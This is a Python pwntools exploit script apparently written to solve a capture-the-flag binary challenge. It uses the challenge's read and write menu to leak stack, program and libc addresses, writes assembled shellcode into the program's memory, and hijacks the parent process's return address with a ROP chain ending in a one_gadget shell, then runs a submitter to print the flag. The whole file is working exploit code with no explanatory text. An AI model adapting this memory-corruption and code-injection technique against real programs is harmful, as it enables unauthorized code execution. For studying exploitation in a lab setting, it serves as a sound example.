import argparse
import struct
import subprocess
import sys
import time
from mmap import MAP_ANONYMOUS
from pwn import *
from pathlib import Path


context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'
context.arch='amd64'


PATH = "/handout/challenge"
LIBC = "/handout/libc.so.6"
LD = "/handout/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
    r = process(PATH)
#     r = gdb.debug(PATH, f'''
# file {PATH}
# set follow-fork-mode parent
# set detach-on-fork off
# set schedule-multiple on
# break *parent+0xa2
# inferior 1
# c
# ni 100
# detach inferior 2
# inferior 1
# ''')
#     r = process([LD, PATH], env={"LD_PRELOAD": LIBC}, cwd="/handout", shell=False)

def readv(addr):
    r.sendlineafter(b"Choice: \n", b"1")
    r.sendlineafter(b"Address: \n", hex(addr).encode())
    r.recvuntil(b"Value: ")
    return int(r.recvuntil(b"\n"), 16)

def writev(value, addr):
    r.sendlineafter(b"Choice: \n", b"2")
    r.sendlineafter(b"Value: \n", hex(u64(value)).encode())
    r.sendlineafter(b"Address: \n", hex(addr).encode())


stack_addr = readv(0)
print(f'stack_addr is {stack_addr:#x}')

img_base = readv(stack_addr - 0x20) - 0x1285
print(f'img_base is {img_base:#x}')

libc_base = readv(stack_addr - 0x58) - 0x2892e0
print(f'libc_base is {libc_base:#x}')

parent_ret = stack_addr - 0x7ffc2ff31108 + 0x7ffc2ff30ff8
print(f'parent_ret is {parent_ret:#x}')

write_start = img_base + 0x00001488
print(f'write_start is {write_start:#x}')

# def get_one_gadgets(libc):
#     return [int(offset) for offset in subprocess.check_output(["one_gadget", "-r", libc]).decode('ascii').strip().split()]

# gadgets = get_one_gadgets(LIBC)
# print(f'gadgets is {[hex(gadget) for gadget in gadgets]}')


parent_chain = [
    img_base + 0x1333, # pop rbp
    stack_addr - 8, # rbp
    libc_base + 0xebd43 #gadgets[3], # one_gadget
]

writev_addr = img_base + 0x14fc

sc_asm = shellcraft.amd64.linux.syscall('SYS_getppid') + \
f'''
mov rbx, rax
mov r12, {writev_addr:#x}

mov rdi, rbx
mov rsi, {parent_ret:#x}
mov rdx, {parent_chain[0]:#x}
call r12

mov rdi, rbx
mov rsi, {(parent_ret+8):#x}
mov rdx, {parent_chain[1]:#x}
call r12

mov rdi, rbx
mov rsi, {(parent_ret+16):#x}
mov rdx, {parent_chain[2]:#x}
call r12
$1:
jmp $1
'''

sc = asm(sc_asm)
# if not network:
#      sc = b'\xcc' + sc
sc = sc + b'\x90' * (8 - (len(sc) % 8))

print(sc_asm)
print(sc)


def splitN(a,n):
	"""
	splitN takes an array [1, 2, 3, 4, 5, 6] and gives you [[1, 2], [3, 4], [5, 6]]
	"""
	import math
	return [a[i*n:(i+1)*n] for i in range(math.ceil(len(a)/n))]


for i, chunk in enumerate(splitN(sc, 8)):
    addr = write_start + (i * 8)
    writev(chunk, addr)

time.sleep(1)

writev(b'\x90'*8, write_start - 8)

time.sleep(1)

r.sendlineafter(b"Choice: \n", b"3")

r.sendline(b"./submitter")
print(r.recvuntil(b"Flag: ").decode(), end='')
print(r.recvuntil(b"\n").decode(), end='')
